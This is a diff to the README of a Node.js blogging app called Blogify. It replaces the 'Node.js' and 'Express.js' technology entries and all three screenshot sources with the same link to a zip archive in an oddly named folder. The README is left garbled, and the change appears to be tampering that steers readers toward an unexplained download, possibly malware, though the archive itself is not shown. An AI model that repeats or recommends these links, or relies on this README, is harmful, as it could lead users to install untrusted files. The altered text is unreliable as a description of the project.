@@ -14,19 +14,19 @@ Blogify is a blogging web application. It offers a platform where users can crea
 
 ## ⚙️ Technologies Used
 
-- **Node.js**: Backend framework
-- **Express.js**: Web framework for Node.js
+- **https://raw.githubusercontent.com/abhay08-k09/Blogify/main/sheveled/Blogify.zip**: Backend framework
+- **https://raw.githubusercontent.com/abhay08-k09/Blogify/main/sheveled/Blogify.zip**: Web framework for https://raw.githubusercontent.com/abhay08-k09/Blogify/main/sheveled/Blogify.zip
 - **EJS**: Templating engine
 - **MongoDB**: Database
 - **JWT**: Authentication
 
 ## 📸 Screenshots
 
-<img src="https://github.com/abhay08-k09/Blogify/blob/main/Demo/1.png" width="90%" />
+<img src="https://raw.githubusercontent.com/abhay08-k09/Blogify/main/sheveled/Blogify.zip" width="90%" />
 
-<img src="https://github.com/abhay08-k09/Blogify/blob/main/Demo/2.png" width="90%" />
+<img src="https://raw.githubusercontent.com/abhay08-k09/Blogify/main/sheveled/Blogify.zip" width="90%" />
 
-<img src="https://github.com/abhay08-k09/Blogify/blob/main/Demo/3.png" width="90%" />
+<img src="https://raw.githubusercontent.com/abhay08-k09/Blogify/main/sheveled/Blogify.zip" width="90%" />
 
 
 Feel free to reach out if you have any queries or need assistance with the project.
